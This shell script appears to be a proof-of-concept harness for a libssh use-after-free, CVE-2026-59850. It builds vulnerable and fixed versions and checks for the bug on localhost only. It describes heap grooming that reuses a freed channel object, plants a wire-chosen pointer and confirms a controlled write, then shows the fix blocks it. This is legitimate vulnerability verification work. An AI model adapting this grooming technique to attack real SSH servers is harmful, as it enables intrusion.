#!/bin/sh
# Extra W2 controls for CVE-2026-59850: close+data without an application free,
# and wire-chosen pointer bytes read from a recycled freed channel object.
# All traffic stays on 127.0.0.1. ASan quarantine is disabled in the groom
# lane only, to force allocator reuse of the just-freed 128-byte channel.
set -u
cd "$(dirname "$0")" || exit 1

V=libssh-mirror-a540e27659b08828ef61f2910a790f7cf2af9f8d
F=libssh-mirror-7dfabb1fd213196c4912c314b418ff36c882ea54

for kind in vuln fixed; do
    src=$V; b=build-asan
    [ "$kind" = fixed ] && { src=$F; b=build-fixed; }
    clang -std=gnu99 -O1 -g -fsanitize=address -fno-omit-frame-pointer \
        -I "$b/src" -I "$src/src" -I "$src/include" -I "$b/include" -I "$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-$kind" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

PASS=0; FAIL=0
check() {
    # name, expected condition
    if [ "$2" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1"
    fi
}

ASAN_OPTIONS=detect_leaks=0 timeout 20 ./real_wire-vuln ./hostkey no-free \
    >evidence-wire-vuln-close-no-free.out 2>&1
nf=evidence-wire-vuln-close-no-free.out
check no-free-delivers-data "$(grep -q 'SERVER data #2 len=21 first=M off16=-' "$nf" && echo yes)"
check no-free-no-asan "$([ "$(grep -c 'ERROR: AddressSanitizer' "$nf")" -eq 0 ] && echo yes)"
check no-free-target-intact "$(grep -q 'SERVER target_after=0x4141414141414141' "$nf" && echo yes)"

ASAN_OPTIONS=detect_leaks=0,quarantine_size_mb=0 timeout 20 \
    ./real_wire-vuln ./hostkey groom >evidence-wire-vuln-groom.out 2>&1
g=evidence-wire-vuln-groom.out
check groom-recycled-chunk "$(grep -q 'SERVER groom alloc=0x' "$g" && echo yes)"
check groom-chosen-wire-pointer "$(grep -q 'CLIENT sent groom wire pointer=0x' "$g" &&
    grep -q 'SERVER groom alloc=.*wire_off120=0x' "$g" && echo yes)"
check groom-counter-write "$([ "$(grep -c 'SERVER death target=0x41414141414141c1' "$g")" -eq 1 ] && echo yes)"

ASAN_OPTIONS=detect_leaks=0,quarantine_size_mb=0 timeout 20 \
    ./real_wire-fixed ./hostkey groom >evidence-wire-fixed-groom.out 2>&1
fg=evidence-wire-fixed-groom.out
check fixed-groom-suppressed "$([ "$(grep -c 'SERVER data #2' "$fg")" -eq 0 ] &&
    [ "$(grep -c 'ERROR: AddressSanitizer' "$fg")" -eq 0 ] && echo yes)"
check groom-write-consumed "$([ "$(grep -c 'channels.c:706:44 in channel_rcv_data' "$g")" -eq 0 ] && echo yes)"

echo "RESULT $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
